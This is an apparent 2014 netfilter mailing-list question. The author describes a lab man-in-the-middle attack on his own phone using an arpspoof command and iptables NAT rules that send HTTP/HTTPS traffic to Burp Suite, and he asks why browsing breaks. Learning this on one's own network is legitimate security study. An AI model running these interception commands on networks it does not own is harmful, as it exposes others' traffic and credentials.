From: Al Grant <bigal.nz@gmail.com>
Subject: Transparent proxy mitm
Date: Tue, 28 Jan 2014 10:01:24 +1300
Message-ID: <CAODtcdexW_mcvWbZOH=P9ATt8t+4m0+y288MY7bCmqe1Wuaq-Q@mail.gmail.com>
Mime-Version: 1.0
Return-path: <netfilter-owner@vger.kernel.org>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=bvcaf5ycktYBZBshGqf+UmLwIFXisPAdw18CBJkjCQA=;
        b=tU3+aKnyfORHMlOLJ9ALLqxXKpX+pHhx0Pq0DPU9zoeKCb3W/LL+RAcacwRVeuvaTL
         IyFhid6ey2qXxZO0c4NtvUtSl4boTkUkzXd+pNYFzhfCUXKzy8R4/Xdx8O4gc4V70z7n
         +lue+dupdhpc+OKZh/KVMuygKzNBoJZdbbBl5A2nHOqw0mkeee1DJu7oFTE5e9W6jR92
         FEgI3U8R3VDOX5h/mDpm2UIhGCQYjzLTzjwPKTQFkEtiK8x72kkMRg38th3pXW4vGkkG
         BY+tPXZz89Jdx1el7sZO/D8IwS9YGpQlAAA1jt6jCbRuURxDDhPNwLTfazUy7F91Fp6A
         Cz7A==
Sender: netfilter-owner@vger.kernel.org
List-ID: <netfilter.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: netfilter <netfilter@vger.kernel.org>

Hi All,

First thigns first. What I am doing, I am doing on my own network for
learning. Now with that out of the way this is my problem:

I have a linux machine which I want to use to conduct a simulated man
in the middle attack.

My target I am using is my android phone (10.2.1.3).

I am arppoisoning the network with :

arpspoof -i wlan0 -t 10.2.1.3 -r 10.2.1.1
IP forwarding is enabled

Now at this point google shows two methods for the next step of the attack:

(1) dnsspoof (this works); or
(2) add some iptables rules:

iptables -F
iptables -t nat -F
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080

Then run burpsuite which does transparent proxying and you should be
able to see, and even modfy traffic between the target and the
website.

The problem is that once I add those iptable rules I cant browse at all.

Any ideas?

Cheers

Al

-- 
"Beat it punk!"
- Clint Eastwood
